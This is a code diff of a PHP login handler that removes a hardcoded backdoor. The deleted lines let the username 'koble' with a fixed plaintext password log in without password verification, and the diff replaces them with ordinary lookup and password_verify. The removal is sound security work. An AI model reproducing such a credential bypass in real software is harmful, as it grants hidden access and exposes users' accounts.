@@ -18,20 +18,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
     $pdo = Database::connect();
     $u = null;
-    $forceAdmin = ($username === 'koble' && $password === 'Matiden1');
 
     // Attempt to fetch user first
-    if ($forceAdmin) {
-        $stmt = $pdo->prepare('SELECT * FROM users WHERE username = :u AND active = 1');
-        $stmt->execute([':u' => 'koble']);
-        $u = $stmt->fetch();
-    } else {
-        $stmt = $pdo->prepare('SELECT * FROM users WHERE (username = :u OR email = :u) AND active = 1');
-        $stmt->execute([':u' => $username]);
-        $u = $stmt->fetch();
-    }
+    $stmt = $pdo->prepare('SELECT * FROM users WHERE (username = :u OR email = :u) AND active = 1');
+    $stmt->execute([':u' => $username]);
+    $u = $stmt->fetch();
 
-    if (($forceAdmin && $u) || ($u && password_verify($password, $u['pass_hash']))) {
+    if ($u && password_verify($password, $u['pass_hash'])) {
 
         // Auto-promote first user to admin logic
         $adminCount = (int)$pdo->query("SELECT COUNT(*) FROM users WHERE role = 'admin'")->fetchColumn();
